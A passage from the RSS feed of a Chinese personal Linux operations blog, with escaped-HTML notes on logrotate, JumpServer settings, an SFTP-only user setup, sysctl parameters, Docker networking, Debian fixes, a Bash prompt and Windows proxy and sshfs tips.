 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h2 class="heading-element" id="logrotate-日志轮转示例"&gt;&lt;span&gt;logrotate 日志轮转示例&lt;/span&gt;
 &lt;a href="#logrotate-%e6%97%a5%e5%bf%97%e8%bd%ae%e8%bd%ac%e7%a4%ba%e4%be%8b" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; vim /etc/logrotate.d/app-logs 
/var/log/myapp/*.log {
 daily # 每天轮转
 rotate 30 # 保留 30 个归档
 missingok # 文件不存在不报错
 notifempty # 空文件不轮转
 compress # 压缩归档（gzip）
 delaycompress # 延迟压缩（下次轮转时压缩）
 dateext # 使用日期后缀（如 .20251024）
 dateformat -%Y%m%d # 日期格式
 create 0640 appuser appgroup # 创建新文件权限
 sharedscripts # 所有日志轮转完后只执行一次脚本
 postrotate # 轮转后执行
 systemctl reload nginx &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 || true
 endscript
}

# 测试配置（不实际执行）
$&amp;gt; logrotate -d /etc/logrotate.d/app-logs

# 强制轮转（调试用）
$&amp;gt; logrotate -f /etc/logrotate.d/app-logs

# 查看 logrotate 状态
$&amp;gt; cat /var/lib/logrotate/status&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="jumpserver-常用配置参数记录"&gt;&lt;span&gt;jumpserver 常用配置参数记录&lt;/span&gt;
 &lt;a href="#jumpserver-%e5%b8%b8%e7%94%a8%e9%85%8d%e7%bd%ae%e5%8f%82%e6%95%b0%e8%ae%b0%e5%bd%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 配置文件路径(默认): /opt/jumpserver/config/config.txt
# 参考连接
## https://docs.jumpserver.org/zh/v2/admin-guide/env/ 
## https://docs.jumpserver.org/zh/v3/installation/setup_linux_standalone/offline_install/
## https://github.com/jumpserver/jumpserver/issues/8697

# 是否开启本地转发 (目前仅对 vscode remote ssh 有效果) 
ENABLE_LOCAL_PORT_FORWARD=True
# 是否开启 针对 vscode 的 remote-ssh 远程开发支持 ( 前置条件: 必须开启 ENABLE_LOCAL_PORT_FORWARD ) v2.11 新增。( 注意: vscode 的连接操作，无审计功能 )
ENABLE_VSCODE_SUPPORT=True

# 磁盘监控
DISK_CHECK_ENABLED=False

# client token 连接过期时间 (koko magnus 等组件) v2.23 添加，默认 300 秒
# 另一个似乎是关于复用连接的，但我已经找不到官方配置说明地址了 
CONNECTION_TOKEN_EXPIRATION=540
CONNECTION_TOKEN_REUSABLE=true

# 使用内置SLB，如果网页获取的客户端IP地址不正确，请将USE_LB设置为0
# 当 USE_LB 设置为 1 时，使用配置 proxy_set_header X-Forwarded-For $remote_addr
# 当 USE_LB 设置为 0 时，使用配置 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for
USE_LB=1

# sftp 是否显示隐藏文件 
SFTP_SHOW_HIDDEN_FILE=true&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="jumpserver-文件管理设计"&gt;&lt;span&gt;jumpserver 文件管理设计&lt;/span&gt;
 &lt;a href="#jumpserver-%e6%96%87%e4%bb%b6%e7%ae%a1%e7%90%86%e8%ae%be%e8%ae%a1" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;堡垒机设置
&lt;ul&gt;
&lt;li&gt;创建一个新的平台&lt;code&gt;LINUX_SFTP_DEFAULT&lt;/code&gt;, 支持协议 &lt;code&gt;sftp&lt;/code&gt;, 端口默认，点开支持协议设置, &lt;code&gt;SFTP&lt;/code&gt; 根路径 设置为 &lt;code&gt;/var/ftproot/${USER}&lt;/code&gt;, 关闭&lt;code&gt;自动化&lt;/code&gt;, 然后保存&lt;/li&gt;
&lt;li&gt;创建一个资产， 平台选择 &lt;code&gt;LINUX_SFTP_DEFAULT&lt;/code&gt;, 其他信息按照实际信息填写，然后保存即可&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;服务器设置
&lt;ul&gt;
&lt;li&gt;在服务器上创建&lt;code&gt;web&lt;/code&gt;用户(以&lt;code&gt;www&lt;/code&gt;为例), &lt;code&gt;useradd -m -k $(mktemp -d) -d /var/ftproot -s /sbin/nologin www&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;修改&lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;文件,添加并重启&lt;code&gt;ssh&lt;/code&gt;
&lt;pre&gt;&lt;code&gt;Match User www
 ForceCommand internal-sftp -l INFO -f AUTH
 PasswordAuthentication no
 PermitTunnel no
 AllowAgentForwarding no
 AllowTcpForwarding no&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;创建 &lt;code&gt;jumpserver&lt;/code&gt; 文件管理用户目录, &lt;code&gt;mkdir /var/ftproot/{{ USER }}&lt;/code&gt;, 这个目录对应的是&lt;code&gt;jumpserver&lt;/code&gt;登陆后的目录，可以不创建，&lt;code&gt;jumpserver&lt;/code&gt;在进行文件管理登陆的时候会自动创建他,&lt;code&gt;{{ USER }}&lt;/code&gt; 是&lt;code&gt;jumpserver&lt;/code&gt;登陆用户名&lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;mount --bind&lt;/code&gt; 绑定实际目录到 &lt;code&gt;/var/ftp/{{ USER }}/&lt;/code&gt; 下， 例如 &lt;code&gt;mount --bind /data/wwwroot /var/ftproot/{{ USER }}/wwwroot&lt;/code&gt; , 或修改 &lt;code&gt;/etc/fstab: /data/wwwroot /var/ftproot/{{ USER }}/wwwroot none defaults,rw,bind 0 0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 class="heading-element" id="一些可能会用到的内核参数"&gt;&lt;span&gt;一些可能会用到的内核参数&lt;/span&gt;
 &lt;a href="#%e4%b8%80%e4%ba%9b%e5%8f%af%e8%83%bd%e4%bc%9a%e7%94%a8%e5%88%b0%e7%9a%84%e5%86%85%e6%a0%b8%e5%8f%82%e6%95%b0" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 开启非root启动1024以下端口
net.ipv4.ip_unprivileged_port_start = 0

# # 禁用整个系统所有接口的IPv6
# net.ipv6.conf.all.disable_ipv6 = 1
# # 禁用某一个指定接口的IPv6(例如：eth0, lo)
# net.ipv6.conf.lo.disable_ipv6 = 1
# net.ipv6.conf.enp0s31f6.disable_ipv6 = 1
# net.ipv6.conf.eth0.disable_ipv6 = 1
# 内存使用率(100-vm.swappiness)时,开始使用交换分区 
vm.swappiness = 0&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="容器间通信的几种方法"&gt;&lt;span&gt;容器间通信的几种方法&lt;/span&gt;
 &lt;a href="#%e5%ae%b9%e5%99%a8%e9%97%b4%e9%80%9a%e4%bf%a1%e7%9a%84%e5%87%a0%e7%a7%8d%e6%96%b9%e6%b3%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;外部网络&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;宿主机创建公共网桥 &lt;code&gt;docker network create public_internal_network&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;每个&lt;code&gt;compose&lt;/code&gt;中都使用&lt;code&gt;networks&lt;/code&gt;配置连接到&lt;code&gt;public_internal_network&lt;/code&gt;网络即可通过&lt;code&gt;服务名:端口&lt;/code&gt;访问对方服务
&lt;pre&gt;&lt;code&gt;# ...

networks:
 common-network:
 external: true
 name: public_internal_network&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start="2"&gt;
&lt;li&gt;&lt;code&gt;Host Gateway&lt;/code&gt; —— &lt;code&gt;访问宿主机服务&lt;/code&gt;/&lt;code&gt;临时跨项目&lt;/code&gt;
&lt;pre&gt;&lt;code&gt;services:
 app:
 image: app
 extra_hosts:
 - &amp;#34;host.docker.internal:host-gateway&amp;#34;

# 访问宿主机应用 http://host.docker.internal:8080
# 访问其他容器应用: http://host.docker.internal:8010&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;</description></item><item><title>那些杂七杂八的记录(二)</title><link>https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/</link><pubDate>Wed, 04 Aug 2021 00:00:00 +0000</pubDate><author>mail@0x5c0f.cc (0x5c0f)</author><guid>https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/</guid><category domain="https://blog.0x5c0f.cc/categories/linux/">Linux</category><category domain="https://blog.0x5c0f.cc/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/">运维记事</category><description>&lt;h2 class="heading-element" id="debian-12-下-rootn--用户无法设置中文问题"&gt;&lt;span&gt;debian 12 下 ROOTN 用户，无法设置中文问题&lt;/span&gt;
 &lt;a href="#debian-12-%e4%b8%8b-rootn--%e7%94%a8%e6%88%b7%e6%97%a0%e6%b3%95%e8%ae%be%e7%bd%ae%e4%b8%ad%e6%96%87%e9%97%ae%e9%a2%98" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;   具体体现是，系统无论如何设置，终端变量始终为 &lt;code&gt;LANG=C&lt;/code&gt; 和 &lt;code&gt;LANGUAGE=C&lt;/code&gt;, 检查了所有设置，最后发现在&lt;code&gt;~/.profile&lt;/code&gt;中，设置了这两个变量，不知道为什么要这样干，删了重载下就可以了&lt;/p&gt;
&lt;h2 class="heading-element" id="debian-系统下-vim-打开文件后鼠标选择为可视模式问题"&gt;&lt;span&gt;debian 系统下， vim 打开文件后鼠标选择为可视模式问题&lt;/span&gt;
 &lt;a href="#debian-%e7%b3%bb%e7%bb%9f%e4%b8%8b-vim-%e6%89%93%e5%bc%80%e6%96%87%e4%bb%b6%e5%90%8e%e9%bc%a0%e6%a0%87%e9%80%89%e6%8b%a9%e4%b8%ba%e5%8f%af%e8%a7%86%e6%a8%a1%e5%bc%8f%e9%97%ae%e9%a2%98" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;全局修改: 编辑 &lt;code&gt;/usr/share/vim/vim82/defaults.vim&lt;/code&gt; , 大概在 &lt;code&gt;80&lt;/code&gt; 行: &lt;code&gt;if has('mouse')&lt;/code&gt; 下，将 &lt;code&gt;set mouse=a&lt;/code&gt; 改为 &lt;code&gt;set mouse=&lt;/code&gt; 即可&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="nginx-添加-ssl-证书后--浏览器仍然提示-不安全你与此网站之间建立的连接并非完全安全"&gt;&lt;span&gt;nginx 添加 ssl 证书后 ， 浏览器仍然提示 &lt;code&gt;不安全(你与此网站之间建立的连接并非完全安全)&lt;/code&gt;&lt;/span&gt;
 &lt;a href="#nginx-%e6%b7%bb%e5%8a%a0-ssl-%e8%af%81%e4%b9%a6%e5%90%8e--%e6%b5%8f%e8%a7%88%e5%99%a8%e4%bb%8d%e7%84%b6%e6%8f%90%e7%a4%ba-%e4%b8%8d%e5%ae%89%e5%85%a8%e4%bd%a0%e4%b8%8e%e6%ad%a4%e7%bd%91%e7%ab%99%e4%b9%8b%e9%97%b4%e5%bb%ba%e7%ab%8b%e7%9a%84%e8%bf%9e%e6%8e%a5%e5%b9%b6%e9%9d%9e%e5%ae%8c%e5%85%a8%e5%ae%89%e5%85%a8" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;多数是因为混合内容，在网站页面文件中,包含了其他网站非&lt;code&gt;https&lt;/code&gt;的资源&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="共享一个我自己用的-bash-prompt"&gt;&lt;span&gt;共享一个我自己用的 Bash Prompt&lt;/span&gt;
 &lt;a href="#%e5%85%b1%e4%ba%ab%e4%b8%80%e4%b8%aa%e6%88%91%e8%87%aa%e5%b7%b1%e7%94%a8%e7%9a%84-bash-prompt" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# ~/.bashrc 
_PS1_CMD_=&amp;#34;\${CONDA_PROMPT_MODIFIER% }\${VIRTUAL_ENV_PROMPT% }\\\\[\\\\][\\[\$(tput sgr0)\\]\\[\\033[38;5;5m\\]\\u\\[\$(tput sgr0)\\]@\\[\$(tput sgr0)\\]\\[\\033[38;5;70m\\]\\h\\[\$(tput sgr0)\\] \\W]\\[\$(tput sgr0)\\]\\[\\033[38;5;77m\\]\${__GIT_BRANCH__}\\[\\033[38;5;9m\\][\\\$?]\\[\$(tput sgr0)\\]\\\\\$ \\[\$(tput sgr0)\\]&amp;#34;

export PROMPT_COMMAND=&amp;#34;${PROMPT_COMMAND:&amp;#43;${PROMPT_COMMAND};} BRANCH=\&amp;#34;\$(git rev-parse --abbrev-ref HEAD 2&amp;gt;/dev/null)\&amp;#34;; __GIT_BRANCH__=\&amp;#34;\${BRANCH:&amp;#43;(\$BRANCH)}\&amp;#34;; PS1=\&amp;#34;${_PS1_CMD_}\n$&amp;gt; \&amp;#34;&amp;#34;

# export PS1=&amp;#34;[\[$(tput sgr0)\]\[\033[38;5;5m\]\u\[$(tput sgr0)\]@\[$(tput sgr0)\]\[\033[38;5;70m\]\h\[$(tput sgr0)\] \W]\[$(tput sgr0)\]\[\033[38;5;9m\][\$?]\[$(tput sgr0)\]\\$ \[$(tput sgr0)\]&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="windows-系统中代理设置问题"&gt;&lt;span&gt;windows 系统中代理设置问题&lt;/span&gt;
 &lt;a href="#windows-%e7%b3%bb%e7%bb%9f%e4%b8%ad%e4%bb%a3%e7%90%86%e8%ae%be%e7%bd%ae%e9%97%ae%e9%a2%98" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;系统设置中, 默认代理设置使用的是 &lt;code&gt;http&lt;/code&gt; 模式，如果想要使用 &lt;code&gt;socks&lt;/code&gt;模式，则在地址栏输入 &lt;code&gt;socks=&amp;lt;proxy_ip&amp;gt;&lt;/code&gt;，端口为&lt;code&gt;socks&lt;/code&gt;端口即可(&lt;code&gt;socks&lt;/code&gt;模式仅在&lt;code&gt;win11&lt;/code&gt;上进行测试，其他系统参考执行)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="windows-挂载-sshfs-方法"&gt;&lt;span&gt;windows 挂载 sshfs 方法&lt;/span&gt;
 &lt;a href="#windows-%e6%8c%82%e8%bd%bd-sshfs-%e6%96%b9%e6%b3%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;本方案看到别人成功过，但自己没有测试成功&lt;/strong&gt;&lt;br&gt;
安装以下内容, 打开 &lt;code&gt;sshfs-win-manager&lt;/code&gt; 正常配置挂载:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/winfsp/winfsp" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://github.com/winfsp/winfsp&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/winfsp/sshfs-win" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://github.com/winfsp/sshfs-win&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/evsar3/sshfs-win-manager" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://github.com/evsar3/sshfs-win-manager&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="proxmox-ve-中使用-cloud-系统镜像快速创建虚拟机"&gt;&lt;span&gt;Proxmox VE 中使用 Cloud 系统镜像快速创建虚拟机&lt;/span&gt;
 &lt;a href="#proxmox-ve-%e4%b8%ad%e4%bd%bf%e7%94%a8-cloud-%e7%b3%bb%e7%bb%9f%e9%95%9c%e5%83%8f%e5%bf%ab%e9%80%9f%e5%88%9b%e5%bb%ba%e8%99%9a%e6%8b%9f%e6%9c%ba" class="heading-mark"&gt;
